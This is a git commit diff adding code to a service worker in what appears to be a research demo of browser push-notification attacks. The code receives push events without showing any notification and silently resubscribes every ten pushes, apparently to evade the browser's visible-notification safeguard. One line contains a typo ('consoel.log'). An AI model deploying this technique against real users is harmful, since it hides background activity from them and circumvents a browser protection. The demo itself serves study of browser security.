5572ba141b4d364464c39ecdc14863190b0002ef
DemoPWA <54972549+DemoPWA@users.noreply.github.com>
2021-04-15 18:30:14 -0400

    Update pushexe_sw.js

--- SW_Attacks/PushExe/pushexe_sw.js
+++ SW_Attacks/PushExe/pushexe_sw.js
@@ -1,4 +1,8 @@
 
+importScripts('../../scripts/encryption.helper.js')
+
+var push_count = 0
+
 self.addEventListener('install', function(event) {
   // The promise that skipWaiting() returns can be safely ignored.
   self.skipWaiting();
@@ -11,4 +15,27 @@ self.addEventListener('activate', function(event){
 //Show not notification on push event and monitor the browser's response
 self.addEventListener('push', function(ev){
    console.log('Push event called!!')
+   push_count +=1
+    // do not call ShowNotification() API
+    if(push_count>10){
+      push_count=0
+      //renew subscription
+        var options = {
+          userVisibleOnly: true,
+          applicationServerKey: base64UrlToUint8Array('BDd3_hVL9fZi9Ybo2UUzA284WG5FZR30_95YeZJsiA' + 'pwXKpNcF1rRPF3foIiBHXRdJI2Qhumhf6_LFTeZaNndIo')
+        };
+        self.registration.pushManager.getSubscription().then(function(subscription) {
+            subscription.unsubscribe().then(function(successful) {
+              console.log('unsubscibed!!')
+              // subscribe again
+              self.registration.pushManager.subscribe(options).then( function (subscription) {
+                   consoel.log('Success:: Renewed Subscription!!')
+              }).catch(function (subscriptionErr) {
+                   console.log('Failure:: Renewal Failed', subscriptionErr)
+              });
+           }).catch(function(e) {
+              // Unsubscribe failed
+           })
+       })
+    }
 })
